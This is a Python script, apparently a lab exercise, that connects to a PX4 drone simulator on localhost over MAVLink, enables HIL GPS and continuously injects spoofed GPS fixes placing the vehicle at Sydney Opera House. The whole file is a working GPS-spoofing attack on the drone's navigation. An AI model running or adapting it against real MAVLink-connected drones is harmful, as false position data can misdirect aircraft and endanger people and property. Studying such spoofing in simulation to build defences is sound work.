from pymavlink import mavutil
import time
import logging
import sys

# Configure logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('gps_spoofing_fixed.log')
    ]
)

logger = logging.getLogger('GPS_Spoofer')

def connect_to_px4():
    """Connect to PX4 SITL simulator interface"""
    try:
        logger.info("Attempting to connect to PX4 SITL simulator at tcp:127.0.0.1:4560")
        master = mavutil.mavlink_connection('tcp:127.0.0.1:4560')
        
        logger.info("Waiting for heartbeat...")
        master.wait_heartbeat(timeout=10)
        
        logger.info("✓ Connected to PX4 SITL simulator successfully")
        logger.info(f"System ID: {master.target_system}, Component ID: {master.target_component}")
        return master
        
    except Exception as e:
        logger.error(f"✗ Failed to connect to PX4 simulator: {e}")
        sys.exit(1)

def send_parameter(master, param_name, param_value):
    """Set PX4 parameter via MAVLink"""
    try:
        master.mav.param_set_send(
            master.target_system,
            master.target_component,
            param_name.encode('utf-8'),
            param_value,
            mavutil.mavlink.MAV_PARAM_TYPE_INT32
        )
        logger.info(f"📝 Set parameter {param_name} = {param_value}")
        time.sleep(1)
    except Exception as e:
        logger.error(f"Failed to set parameter: {e}")

def send_spoofed_gps(master, lat, lon, alt, iteration):
    """Send spoofed GPS data with correct parameter count"""
    try:
        timestamp = int(time.time() * 1e6)
        
        # FIXED: Correct number of parameters (15 total)
        master.mav.hil_gps_send(
            timestamp,              # UNIX time in microseconds
            3,                      # fix_type: 3D fix
            int(lat * 1e7),         # lat: degrees * 1e7
            int(lon * 1e7),         # lon: degrees * 1e7
            int(alt * 1000),        # alt: millimeters
            30,                     # eph: HDOP * 100 (cm)
            40,                     # epv: VDOP * 100 (cm)
            0,                      # vel: velocity in cm/s
            0, 0, 0,                # vn, ve, vd: velocity components (cm/s)
            0,                      # cog: course over ground (degrees * 100)
            10,                     # satellites_visible
            0                       # id (removed yaw parameter)
        )
        
        if iteration % 25 == 0:
            logger.info(f"📡 GPS Spoofing Active - Iteration: {iteration}")
            logger.info(f"   Spoofed Location: {lat:.6f}°, {lon:.6f}°, {alt}m")
        else:
            logger.debug(f"Sent HIL_GPS #{iteration}")
            
    except Exception as e:
        logger.error(f"✗ Failed to send GPS data: {e}")

def main():
    """Main GPS spoofing function"""
    logger.info("🎯 GPS Spoofing Attack - PX4 SITL")
    logger.info("=" * 50)
    
    # Connect to PX4 simulator
    master = connect_to_px4()
    
    # Set HIL GPS parameter
    logger.info("Setting MAV_USEHILGPS parameter...")
    send_parameter(master, "MAV_USEHILGPS", 1)
    time.sleep(2)
    
    # Sydney Opera House coordinates
    target_lat = -33.8568
    target_lon = 151.2153
    target_alt = 20
    
    logger.info(f"🎯 Original: 47.397742°, 8.545594°, 488m")
    logger.info(f"🎯 Spoofed: {target_lat}°, {target_lon}°, {target_alt}m")
    logger.info("🚀 Starting GPS injection...")
    
    iteration = 0
    
    try:
        while True:
            send_spoofed_gps(master, target_lat, target_lon, target_alt, iteration)
            iteration += 1
            time.sleep(0.2)
            
    except KeyboardInterrupt:
        logger.info("🛑 GPS spoofing stopped")
        send_parameter(master, "MAV_USEHILGPS", 0)
    finally:
        master.close()

if __name__ == "__main__":
    main()

